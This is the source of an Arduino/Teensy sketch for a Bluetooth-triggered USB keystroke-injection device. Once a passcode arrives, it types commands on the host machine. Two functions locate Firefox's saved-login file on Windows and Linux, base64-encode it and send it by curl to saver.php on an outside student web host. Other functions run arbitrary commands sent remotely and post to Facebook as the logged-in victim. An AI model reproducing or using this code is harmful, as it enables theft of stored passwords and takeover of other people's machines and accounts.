#include <string>

#include <SoftwareSerial.h>
#include <BluetoothSerial.h>

/*
//wersja wolna
#define DELAY_AFTER_R 1000
#define DELAY_AFTER_F2 1000
#define DELAY_AFTER_ENTER_F2 1000
#define DELAY_AFTER_ENTER 500
#define DELAY_AFTER_INIT 500
*/


//wersja szybka
#define DELAY_AFTER_R 1000
#define DELAY_AFTER_F2 500
#define DELAY_AFTER_F6 300
#define DELAY_AFTER_ENTER_F2 800
#define DELAY_AFTER_ENTER_R 800
#define DELAY_AFTER_ENTER 200
#define DELAY_AFTER_INIT 500
#define DELAY_AFTER_FIREFOX (2000+delay_for_windows)
#define DELAY_AFTER_JAVASCRIPT (800+delay_for_windows)
#define DELAY_AFTER_TAB 400
#define FB_LOAD 5000

#define IP "student.agh.edu.pl/~magorka/"
#define NAME "NOTHING"
#define CODE "ccpccoqc"

using namespace std;

// Teensy 2.0 has the LED on pin 11
// Teensy++ 2.0 has the LED on pin 6
// Teensy 3.0 has the LED on pin 13
const int ledPin = 13;
bool led;
int code_len;
int code_at=0;
char cmd[50];
int now=0;
int delay_for_windows=0;

void setup() {
  pinMode(ledPin, OUTPUT);
  led=0;
  Serial.begin(9600);
  BTSerial.begin(9600);
  delay(DELAY_AFTER_INIT);
  main_program();
  code_len=strlen(CODE);
}

void led_on()
{
  digitalWrite(ledPin, HIGH);
  led=1;
}

void led_off()
{
  digitalWrite(ledPin, LOW);
  led=0;
}

void led_switch()
{
  if(led)
    led_off();
  else
    led_on();
}

void print(const char *cmd)
{
  Keyboard.print(cmd);
}

void printc(char c)
{
  char t[2];
  t[1]=0;
  t[0]=c;
  print(t);
}

void windows_r()
{
  Keyboard.set_modifier(128); //Windows key
  Keyboard.set_key1(KEY_R); // use r key
  Keyboard.send_now(); // send strokes
  Keyboard.set_modifier(0); //prep release of control keys
  Keyboard.set_key1(0); //have to do this to keep it from hitting key multiple times.
  Keyboard.send_now(); //Send the key changes
  delay(DELAY_AFTER_R);
}

void ctrl_t()
{
  Keyboard.set_modifier(MODIFIERKEY_CTRL); //Windows key
  Keyboard.set_key1(KEY_T); // use r key
  Keyboard.send_now(); // send strokes
  Keyboard.set_modifier(0); //prep release of control keys
  Keyboard.set_key1(0); //have to do this to keep it from hitting key multiple times.
  Keyboard.send_now(); //Send the key changes
  delay(DELAY_AFTER_R);
}

void enter()
{
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(DELAY_AFTER_ENTER); 
}

void tab()
{
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(DELAY_AFTER_TAB); 
}

void enter_f2()
{
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(DELAY_AFTER_ENTER_F2); 
}

void enter_firefox()
{
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(DELAY_AFTER_FIREFOX); 
}

void windows_steal_ff()
{
  const unsigned size = 0x1000;
  char s [size];
  memset(s, 0, size);
  led_on();
  windows_r();
  print("cmd");
  enter_f2();
  print("cd %appdata%");
  enter();
  print("cd Mozilla\\Firefox\\Profiles\\7eq40jcq.default");
  enter();
  print("powershell");
  enter();
  print("$content = [IO.File]::ReadAllText(\"notlogins.json\")");
  enter();
  print("$content = [System.Text.Encoding]::Unicode.GetBytes($content)");
  enter();
  print("$base64cont = [System.Convert]::ToBase64String($content)");
  enter();
  strcat(s, "curl ");
  strcat(s, IP);
  strcat(s, "saver.php?value=firefox\"&\"data=$base64cont");
  print(s);
  enter();
  print("exit");
  enter();
  print("exit");
  enter();
  led_off();
}


void alt_f2()
{
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_F2);
  Keyboard.send_now();
  Keyboard.set_modifier(0); //prep release of control keys
  Keyboard.set_key1(0); //have to do this to keep it from hitting key multiple times.
  Keyboard.send_now(); //Send the key changes
  delay(DELAY_AFTER_F2);
}


void f6()
{
  Keyboard.set_key1(KEY_F6);
  Keyboard.send_now();
  Keyboard.set_key1(0); //have to do this to keep it from hitting key multiple times.
  Keyboard.send_now(); //Send the key changes
  delay(DELAY_AFTER_F6);
}

void linux_steal_ff() //tested
{
  led_on();
  alt_f2();
  print("terminal");
  enter_f2();
  print("cd .mozilla/firefox");
  enter();
  print("cd `cat profiles.ini | grep Path | cut -d'=' -f2`");
  enter();
  char tmp[1000];
  memset(tmp,0,1000);
  strcpy(tmp,"curl http://");
  strcat(tmp,IP);
  strcat(tmp,"/saver.php?data=`base64 logins.json | paste -d, -s`");
  print(tmp);
  enter();
  print("exit");
  enter();
  led_off();
}

void bluetooth_server()
{
  led_on();
  BTSerial.write("AT\r\n"); // expect "OK"
  BTSerial.setPinCode("1234");
  BTSerial.setDeviceName(NAME);
}

void main_program()
{
  bluetooth_server();
}

void windows_cmd(char *a)
{
  led_on();
  windows_r();
  print("cmd");
  enter();
  delay(DELAY_AFTER_ENTER_R);
  print(a);
  enter();
  print("exit");
  enter();
  led_off();
}

void linux_cmd(char *a) //tested
{
  led_on();
  alt_f2();
  print("terminal");
  enter_f2();
  print(a);
  enter();
  print("exit");
  enter();
  led_off();
}

void matrix()
{
  for (int i=0;i<1000;i++)
    print("matrix ");
}

void linux_fb_post(char *post)
{
  led_on();
  alt_f2();
  print("firefox");
  enter_firefox();
  f6();
  print("https://www.facebook.com/");
  enter();
  delay(FB_LOAD);
  f6();
  print("javascript:document.getElementById(\"u_0_y\").focus()");
  delay(DELAY_AFTER_JAVASCRIPT);
  enter();
  print(post);
  f6();
  print("javascript:(document.getElementsByClassName(\"_11b\")[0]).focus()");
  enter();
  enter();
  led_off();
}

void windows_fb_post(char *post) //tested
{
  delay_for_windows=500;
  led_on();
  windows_r();
  print("firefox");
  enter();
  delay(5000);
  f6();
  print("https://www.facebook.com/");
  enter();
  delay(FB_LOAD);
  f6();
  print("javascript:document.getElementById(\"u_0_y\").focus()");
  delay(DELAY_AFTER_JAVASCRIPT+200);
  enter();
  print(post);
  f6();
  print("javascript:(document.getElementsByClassName(\"_11b\")[0]).focus()");
  delay(DELAY_AFTER_JAVASCRIPT+200);
  enter();
  enter();
  led_off();
}

void run_command()
{
  if(!strncmp(cmd,"linux_steal_ff",strlen("linux_steal_ff")))
    linux_steal_ff();
  else if(!strncmp(cmd,"windows_steal_ff",strlen("windows_steal_ff")))
    windows_steal_ff();
  else if(!strncmp(cmd,"windows:",strlen("windows:")))
    windows_cmd(cmd+strlen("windows:"));
  else if(!strncmp(cmd,"linux:",strlen("linux:")))
    linux_cmd(cmd+strlen("linux:"));
  else if(!strncmp(cmd,"matrix",strlen("matrix")))
    matrix();
  else if(!strncmp(cmd,"linux_fb_post:",strlen("linux_fb_post:")))
    linux_fb_post(cmd+strlen("linux_fb_post:"));
  else if(!strncmp(cmd,"windows_fb_post:",strlen("windows_fb_post:")))
    windows_fb_post(cmd+strlen("windows_fb_post:"));
}

void loop() {
  if(BTSerial.available())
  {
    if(now==0)
    {
      char a= (char) BTSerial.read();
      if(CODE[code_at]==(char) a)
          code_at++;
      else
          code_at=0;
      if(code_at==code_len)
      {
          now=1;
          code_at=0;
      }
    }
    else if(now==1)
    {
      char z=(char) BTSerial.read();
      if (z=='+')
      {
        cmd[code_at]=0;//bug bez tego
        run_command();
        code_at=0;
        now=0;
      }
      else
      {
        cmd[code_at++]=z;
        if(code_at==sizeof(cmd))
        {
          now=0;
          print("uga buga buga buga");
          code_at=0;
        }
      }
    }
  }
}
/*
void loop() {
  if(BTSerial.available())
  {
    char a=(char) BTSerial.read();
    printc(a);
  }
}*/
